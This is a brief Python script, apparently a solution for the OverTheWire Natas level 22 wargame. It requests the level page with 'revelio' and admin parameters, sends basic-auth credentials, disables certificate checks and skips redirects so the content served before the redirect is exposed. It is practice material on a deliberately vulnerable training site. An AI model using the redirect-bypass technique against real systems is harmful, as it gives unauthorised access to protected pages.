import requests
from requests.auth import HTTPBasicAuth

username = 'natas22'

auth = HTTPBasicAuth('natas22', 'wherethepassword')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

crossurl = "http://natas22.natas.labs.overthewire.org/index.php?revelio&admin=1"

#Get redirection response without redirection
response=requests.get(crossurl, headers=headers, auth=auth, verify=False,allow_redirects=False)
print(response.text)

